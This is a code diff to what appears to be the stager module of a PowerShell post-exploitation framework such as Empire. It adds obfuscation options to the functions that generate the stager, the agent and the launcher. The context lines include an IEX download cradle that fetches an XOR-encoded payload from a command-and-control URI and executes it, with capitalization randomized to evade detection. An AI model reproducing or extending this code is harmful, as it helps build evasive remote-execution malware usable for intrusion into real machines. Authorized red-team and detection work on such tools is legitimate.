@@ -12,7 +12,6 @@ import encryption
 import os
 import base64
 
-
 class Stagers:
 
     def __init__(self, MainMenu, args):
@@ -77,7 +76,7 @@ class Stagers:
                     stager.options[option]['Value'] = str(value)
 
 
-    def generate_stager(self, server, key, encrypt=True, encode=False):
+    def generate_stager(self, server, key, encrypt=True, encode=False, obfuscate=False, obfuscationCommand=""):
         """
         Generate the PowerShell stager that will perform
         key negotiation with the server and kick off the agent.
@@ -86,7 +85,6 @@ class Stagers:
                 ... other PowerShell obfuscation techniques?
                     http://desktoplibrary.livelink-experts.com/obfuscate-powershell-user-manual ?
         """
-
         # read in the stager base
         f = open(self.installPath + "/data/agent/stager.ps1")
         stager = f.read()
@@ -100,7 +98,7 @@ class Stagers:
         stager = stager.replace("REPLACE_STAGING_KEY", key)
         stager = stager.replace("index.jsp", self.stage1)
         stager = stager.replace("index.php", self.stage2)
-
+        
         randomizedStager = ""
 
         for line in stager.split("\n"):
@@ -113,6 +111,8 @@ class Stagers:
                 else:
                     randomizedStager += line
 
+        if obfuscate:
+            randomizedStager = helpers.obfuscate(randomizedStager, self.installPath, obfuscationCommand=obfuscationCommand)
         # base64 encode the stager and return it
         if encode:
             return helpers.enc_powershell(randomizedStager)
@@ -164,7 +164,7 @@ class Stagers:
             return randomizedStager
 
 
-    def generate_agent(self, delay, jitter, profile, killDate, workingHours, lostLimit):
+    def generate_agent(self, delay, jitter, profile, killDate, workingHours, lostLimit, obfuscate=False, obfuscationCommand=""):
         """
         Generate "standard API" functionality, i.e. the actual agent.ps1 that runs.
         
@@ -190,7 +190,8 @@ class Stagers:
             code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
         if workingHours != "":
             code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
-
+        if obfuscate:
+            code = helpers.obfuscate(code, self.installPath, obfuscationCommand=obfuscationCommand)
         return code
 
 
@@ -278,7 +279,7 @@ class Stagers:
         return server + checksum
 
 
-    def generate_launcher(self, listenerName, encode=True, userAgent="default", proxy="default", proxyCreds="default", stagerRetries="0"):
+    def generate_launcher(self, listenerName, encode=True, obfuscate=False, obfuscationCommand="",userAgent="default", proxy="default", proxyCreds="default", stagerRetries="0"):
         """
         Generate the initial IEX download cradle with a specified
         c2 server and a valid HTTP checksum.
@@ -293,7 +294,7 @@ class Stagers:
                         any other text is used as the proxy
 
         """
-
+        
         # if we don't have a valid listener, return nothing
         if not self.mainMenu.listeners.is_listener_valid(listenerName):
             print helpers.color("[!] Invalid listener: " + listenerName)
@@ -350,9 +351,11 @@ class Stagers:
             stager += helpers.randomize_capitalization("$R=%s;do{try{$i=0;[cHAR[]]$B=([cHAR[]]($WC.DoWNLOadSTriNg(\"" %(stagerRetries))
             stager += URI
             stager += helpers.randomize_capitalization("\")))|%{$_-bXor$k[$i++%$k.Length]};IEX ($b-join''); $R=0;}catch{sleep "+str(defaultDelay)+";$R--}} while ($R -gt 0)")
-
+        
+        if obfuscate:
+           stager = helpers.obfuscate(stager, self.installPath, obfuscationCommand=obfuscationCommand)
         # base64 encode the stager and return it
-        if encode:
+        if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
             return helpers.powershell_launcher(stager)
         else:
             # otherwise return the case-randomized stager
